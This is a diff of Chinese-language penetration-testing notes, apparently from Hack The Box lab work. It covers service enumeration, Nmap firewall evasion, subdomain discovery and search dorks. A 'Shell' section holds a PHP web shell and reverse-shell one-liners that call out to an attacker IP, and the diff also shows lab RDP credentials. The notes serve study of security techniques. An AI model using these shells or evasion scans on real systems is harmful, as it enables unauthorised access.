@@ -1,4 +1,6 @@
-# SMB
+# 一、基础服务
+
+## 1.1 SMB
 
 ```
 nmap --script smb-os-discovery.nse -p445 10.129.181.147
@@ -30,7 +32,7 @@ git clone https://github.com/cddmp/enum4linux-ng.git
 ./enum4linux-ng.py 10.129.14.128 -A
 ```
 
-# SNMP
+## 1.2 SNMP
 
 在 SNMP 版本 1 和 2c 中，使用纯文本社区字符串控制访问，如果我们知道名称，就可以访问它。加密和身份验证仅在 SNMP 版本 3 中添加。
 
@@ -40,80 +42,20 @@ snmpwalk -v 2c -c private  10.129.42.253 #查询名称找Nday
 onesixtyone -c dict.txt 10.129.42.254
 ```
 
-# Shell
-
-```php
-<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.113 9443 >/tmp/f"); ?>
-    
-```
-
-```shell-session
-gobuster dir -u http://10.129.73.163/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
-curl http://10.129.91.93/nibbleblog/README
-echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.113 8443 >/tmp/f' | tee -a monitor.sh /usr/bin/php
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-sudo php -r '$sock=fsockopen("10.10.14.113",8443);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-# Nmap
-
-```
-sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
-sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping #可以根据TTL推断系统
-xsltproc target.xml -o target.html #比较直观好看
-nc -nv 10.129.2.28 25#会显示系统类型
-nmap 10.129.2.28 -p 80 -sV --script vuln #漏洞检测
-sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 #使用诱饵
-sS SYN;sA ACK;sT Connect，sS容易被过滤，sA不容易被过滤
-
-#####规避防火墙
-sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
-nmap -sU -p 53 --script dns-nsid,banner -Pn -n -disable-arp-ping -sV 10.129.2.48
-1)nmap x.x.x.x -sS -Pn -n --source-port 53
-2)nmap x.x.x.x -sT -Pn -n --source-port 53 -D RND:5
-nmap x.x.x.x -sT -pn -n --source-port 53 -D RND:5 -p 53 -sV
-3)nmap x.x.x.x -sS -Pn -n --source-port 53 -D RND:5
-nmap x.x.x.x -sT -pn -n --source-port 5000 -D RND:5 -p 53 -sV
-ncat -nv --source-port 53 10.129.102.234 5000
-nmap -sS -A -T2 --data-length 1400 #分片绕过防火墙
-```
-
-```
-其他扫描软件
-rustscan -b 500 -t 4000 -a x.x.x.x --range 1-65535
-fscan -h x.x.x.x -p 1-65535
-scaninfo -i x.x.x.x -p 1-65535
-```
-
-# 子域名收集
-
-```
-curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .#以json格式输出
-
-curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u#按唯一子域对它们进行筛选
-```
-
-# exploits
-
-```
-find / -type f -name ftp* 2>/dev/null | grep scripts #nmap
-```
-
-以下服务的利用可以用于查找服务的配置，找到弱配置。
-
-# FTP
+## 1.3 FTP
 
 ```
 cat /etc/ftpusers
+find / -type f -name ftp* 2>/dev/null | grep scripts #nmap
 ```
 
- TFTP 与 FTP 不同，它不需要用户的身份验证。它不支持通过密码进行受保护的登录，并且仅根据作系统中文件的读写权限设置访问限制。与 FTP 客户端不同，`TFTP` 没有目录列表功能。
+以下服务的利用可以用于查找服务的配置，找到弱配置。TFTP 与 FTP 不同，它不需要用户的身份验证。它不支持通过密码进行受保护的登录，并且仅根据作系统中文件的读写权限设置访问限制。与 FTP 客户端不同，`TFTP` 没有目录列表功能。
 
 FTP是tcp协议，有主动模式和被动模式，21端口是控制端口，一定会有，20端口（数据）是主动模式会打开，被动模式一般FTP服务器会开放其他的高位端口等待连接。
 
 
 
-# NFS
+## 1.4 NFS
 
 ```
 sudo nmap 10.129.14.128 -p111,2049 -sV -sC
@@ -130,7 +72,7 @@ ls -n mnt/nfs/
 sudo umount ./target-NFS
 ```
 
-# DNS
+## 1.5 DNS
 
 ```
 for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done#子域暴力破解
@@ -143,7 +85,7 @@ dig @1.1.1.1 domain.com #表示使用1.1.1.1这个域名服务器进行查询
 
 
 
-## Record DNS
+### 1.5.1 Record DNS
 
 **A:**结果返回所请求域的 IPv4 地址。
 
@@ -181,13 +123,23 @@ dig any inlanefreight.htb @10.129.14.128
 dig axfr inlanefreight.htb @10.129.14.128 区域传输
 ```
 
-# SMTP
+### 1.5.2 DNS将域名转换为ip的路径
+
+1、看本地缓存
+
+2、看根解析器，全球有 13 个根服务器
+
+3、看顶级域名解析器，例如，.com、.org
+
+4、看权威域名解析器 —返回ip，它的作用是保存域的实际 IP 地址的服务器，通常由托管服务提供商或域注册商管理。
+
+## 1.6 SMTP
 
 ```
 smtp-user-enum -M VRFY -U /usr/share/seclists/Discovery/SNMP/snmp.txt -t 10.129.145.179 -w 15
 ```
 
-# IMAP/POP3
+## 1.7 IMAP/POP3
 
 110和995(加密)用于pop3
 
@@ -204,7 +156,7 @@ robin：robin
 
 imap支持用户列举，但pop3不支持。
 
-# SNMP
+## 1.8 SNMP
 
 161端口发送控制指令
 
@@ -214,7 +166,7 @@ SNMPv1 `没有内置的身份验证`机制，SNMPv2 存在于不同的版本中�
 snmpwalk -v2c -c public 10.129.14.128
 ```
 
-# Oracle
+## 1.9 Oracle
 
 1521端口
 
@@ -243,7 +195,7 @@ pip3 install pycryptodome
 
 ```
 
-# IPMI
+## 1.10 IPMI
 
 IPMI 通过端口 623 UDP 进行通信。
 
@@ -289,7 +241,7 @@ git commit -m "Your commit message"
 git push origin master
 ```
 
-# SSH
+## 1.11 SSH
 
 ```
  2016 年 OpenSSH 7.2p1 版本中的命令注入漏洞
@@ -303,7 +255,7 @@ Rsync允许通过SSH进行安全的数据传输，默认端口是873
 
 r-services，比如rcp、rexec、rsh等。默认端口是512，513，514，一些内网的机器可能会有。
 
-# RDP
+## 1.12 RDP
 
 可以通过多种方式进行身份验证和连接到此类 RDP 服务器。例如，我们可以使用 `xfreerdp`、`rdesktop` 或 `Remmina` 连接到 Linux 上的 RDP 服务器，并相应地与服务器的 GUI 进行交互。
 
@@ -314,6 +266,155 @@ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
 WinRM 依靠 `TCP` 端口 `5985` 和 `5986` 进行通信，最后一个端口 `5986 使用 HTTPS`
 
 WMI 通信的初始化始终在 `TCP` 端口 `135` 上进行，成功建立连接后，通信将移动到随机端口。
+
+# 二、Shell
+
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.113 9443 >/tmp/f"); ?>
+```
+
+```shell-session
+gobuster dir -u http://10.129.73.163/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+curl http://10.129.91.93/nibbleblog/README
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.113 8443 >/tmp/f' | tee -a monitor.sh /usr/bin/php
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo php -r '$sock=fsockopen("10.10.14.113",8443);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+# 三、信息收集
+
+## 3.1 Nmap
+
+```
+sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
+sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping #可以根据TTL推断系统
+xsltproc target.xml -o target.html #比较直观好看
+nc -nv 10.129.2.28 25#会显示系统类型
+nmap 10.129.2.28 -p 80 -sV --script vuln #漏洞检测
+sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 #使用诱饵
+sS SYN;sA ACK;sT Connect，sS容易被过滤，sA不容易被过滤
+
+#####规避防火墙
+sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
+nmap -sU -p 53 --script dns-nsid,banner -Pn -n -disable-arp-ping -sV 10.129.2.48
+1)nmap x.x.x.x -sS -Pn -n --source-port 53
+2)nmap x.x.x.x -sT -Pn -n --source-port 53 -D RND:5
+nmap x.x.x.x -sT -pn -n --source-port 53 -D RND:5 -p 53 -sV
+3)nmap x.x.x.x -sS -Pn -n --source-port 53 -D RND:5
+nmap x.x.x.x -sT -pn -n --source-port 5000 -D RND:5 -p 53 -sV
+ncat -nv --source-port 53 10.129.102.234 5000
+nmap -sS -A -T2 --data-length 1400 #分片绕过防火墙
+```
+
+```
+其他扫描软件
+rustscan -b 500 -t 4000 -a x.x.x.x --range 1-65535
+fscan -h x.x.x.x -p 1-65535
+scaninfo -i x.x.x.x -p 1-65535
+```
+
+## 3.2 子域名收集
+
+```
+curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .#以json格式输出
+
+curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u#按唯一子域对它们进行筛选
+```
+
+### 3.2.1 子域名枚举
+
+#### 3.2.1.1 主动枚举
+
+##### 暴力破解
+
+```
+dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r #-r是递归的意思
+```
+
+##### Virtual Hosts
+
+核心是 Web 服务器能够区分共享同一 IP 地址的多个网站或应用程序。这是通过利用 `HTTP Host` 标头实现的。
+
+网站通常具有非公开的子域，并且不会显示在 DNS 记录中。这些`子域`只能在内部或通过特定配置访问。`VHost 模糊测试`是一种通过针对已知 IP 地址测试各种主机名来发现公有和非公有`子域`和 `VHost` 的技术。
+
+虚拟主机提供的几种形式：
+
+1.基于名称的虚拟主机，多个网站绑定一个ip。
+
+2.基于ip的虚拟主机，不同网站不同ip。
+
+3.基于端口的虚拟主机，不同网站同一ip不同端口。
+
+**host碰撞**
+
+```
+vim /etc/hosts 填写ip和主域名
+```
+
+```
+gobuster vhost -u http://域名:38644 -w <wordlist_file> --append-domain -t 50 -k(忽略TLS证书错误)
+```
+
+#### 3.2.1.2 被动枚举
+
+##### DNS区域传输
+
+```
+dig axfr @ns服务器地址 域名
+```
+
+## 3.3 证书查找
+
+```shell-session
+curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[]
+ | select(.name_value | contains("dev")) | .name_value' | sort -u
+```
+
+## 3.4 搜索引擎信息侦察
+
+```
+site:example.com
+inurl:login
+filetype:pdf
+intitle:"confidential report"
+intext:"password reset"
+cache:example.com
+link:example.com
+related:example.com
+info:example.com
+define:phishing
+site:example.com numrange:1000-2000	
+allintext:admin password reset
+allinurl:admin panel
+allintitle:confidential report 2023	
+site:example.com AND (inurl:admin OR inurl:login)
+"linux" OR "ubuntu" OR "debian"
+site:bank.com NOT inurl:login
+site:socialnetwork.com filetype:pdf user* manual
+site:ecommerce.com "price" 100..500
+"information security policy"
+site:news.com -inurl:sports
+site:example.com inurl:login
+site:example.com (inurl:login OR inurl:admin)
+site:example.com filetype:pdf
+site:example.com (filetype:xls OR filetype:docx)
+site:example.com inurl:config.php
+site:example.com (ext:conf OR ext:cnf)
+site:example.com (ext:conf OR ext:cnf)
+site:example.com inurl:backup
+site:example.com filetype:sql
+```
+
+## 3.5 爬行
+
+```
+wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
+unzip ReconSpider.zip
+pip3 install scrapy
+python3 ReconSpider.py http://inlanefreight.com
+```
+
+
 
 # writeup
 
@@ -439,65 +540,27 @@ show tables;
 select * from users where username = 'HTB';
 ```
 
+## Skills Assessment  writeup
+
+
+
+```
+nano /etc/hosts
+94.237.49.101 inlanefreight.htb
+```
+
+```
+###solution 1
+whois inlanefreight.htb
+###solution 2
+nmap -p 53231 -sV 94.237.49.101
+###solution 3
+gobuster vhost -u http://web1337.inlanefreight.htb:31591 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 50 -k
+```
+
+<img src="\image-20250512154801344.png" alt="image-20250506151633677" style="zoom:50%;" />
+
 # 钓鱼邮件甄别
 
 whois 注册时间近期、隐藏注册者身份、名称服务器通常与已知恶意服务提供商相关联。
 
-# DNS将域名转换为ip的路径
-
-1、看本地缓存
-
-2、看根解析器，全球有 13 个根服务器
-
-3、看顶级域名解析器，例如，.com、.org
-
-4、看权威域名解析器 —返回ip，它的作用是保存域的实际 IP 地址的服务器，通常由托管服务提供商或域注册商管理。
-
-# 子域名枚举
-
-## 主动枚举
-
-### 暴力破解
-
-```
-dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r #-r是递归的意思
-```
-
-## 被动枚举
-
-### DNS区域传输
-
-```
-dig axfr @ns服务器地址 域名
-```
-
-## Virtual Hosts
-
-核心是 Web 服务器能够区分共享同一 IP 地址的多个网站或应用程序。这是通过利用 `HTTP Host` 标头实现的。
-
-网站通常具有非公开的子域，并且不会显示在 DNS 记录中。这些`子域`只能在内部或通过特定配置访问。`VHost 模糊测试`是一种通过针对已知 IP 地址测试各种主机名来发现公有和非公有`子域`和 `VHost` 的技术。
-
-虚拟主机提供的几种形式：
-
-1.基于名称的虚拟主机，多个网站绑定一个ip。
-
-2.基于ip的虚拟主机，不同网站不同ip。
-
-3.基于端口的虚拟主机，不同网站同一ip不同端口。
-
-**host碰撞**
-
-```
-vim /etc/hosts 填写ip和主域名
-```
-
-```
-gobuster vhost -u http://域名:38644 -w <wordlist_file> --append-domain -t 50 -k(忽略TLS证书错误)
-```
-
-### 证书查找
-
-```shell-session
-curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[]
- | select(.name_value | contains("dev")) | .name_value' | sort -u
-```
